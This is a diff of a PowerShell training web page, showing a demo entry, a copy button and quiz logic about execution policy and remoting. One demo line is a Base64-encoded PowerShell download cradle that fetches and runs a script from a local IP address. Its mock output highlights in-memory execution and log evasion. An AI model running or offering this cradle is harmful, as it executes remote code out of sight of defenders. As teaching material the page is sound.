+                cmd: 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA5ADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwAp',
+                output: `# Encoded command executed successfully
+# The payload was decoded in-memory and executed
+# No file was written to disk
+# Command-line logging shows only the Base64 string`
             }
         };
 
@@ -425,6 +1346,65 @@ LAPTOP-R... 192.168.1.42 192.168.1.42             32     1
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(`tab-${tabId}`).classList.add('active');
             event.target.classList.add('active');
+        }
+
+        // --- COPY BUTTON ---
+        function copyToClipboard(btn) {
+            const codeBlock = btn.parentElement;
+            const text = codeBlock.innerText.replace('Copy', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 1500);
+            }).catch(() => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 1500);
+            });
+        }
+
+        // --- QUIZ LOGIC ---
+        const quizAnswers = {
+            1: { correct: 'A', explanation: 'Correct! PowerShell passes .NET objects through the pipeline, enabling property-based filtering and method calls. CMD and Bash pass raw text, requiring tools like grep/awk/cut for parsing.' },
+            2: { correct: 'B', explanation: 'Correct! Execution Policy is explicitly NOT a security boundary. It only controls script file execution. Interactive commands (-Command), encoded commands, and in-memory execution are unaffected.' },
+            3: { correct: 'B', explanation: 'Correct! PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986. WMI uses DCOM on port 135, but that is a different protocol.' }
+        };
+
+        function checkAnswer(quizNum, selected, element) {
+            const quizContainer = document.getElementById(`quiz-${quizNum}`);
+            const options = quizContainer.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(`feedback-${quizNum}`);
+            const answer = quizAnswers[quizNum];
+
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                opt.style.opacity = '0.7';
+            });
+
+            // Highlight selected
+            element.style.opacity = '1';
+            if (selected === answer.correct) {
+                element.classList.add('correct');
+                feedback.className = 'quiz-feedback show correct';
+                feedback.innerHTML = `<strong>✅ Correct!</strong> ${answer.explanation}`;
+            } else {
+                element.classList.add('wrong');
+                // Highlight correct answer
+                options.forEach(opt => {
+                    if (opt.innerHTML.includes(`<strong>${answer.correct}.</strong>`)) {
+                        opt.classList.add('correct');
+                        opt.style.opacity = '1';
+                    }
+                });
+                feedback.className = 'quiz-feedback show wrong';
+                feedback.innerHTML = `<strong>❌ Incorrect.</strong> The correct answer is <strong>${answer.correct}</strong>. ${answer.explanation}`;
+            }
         }
         
         // Auto-run first demo on load
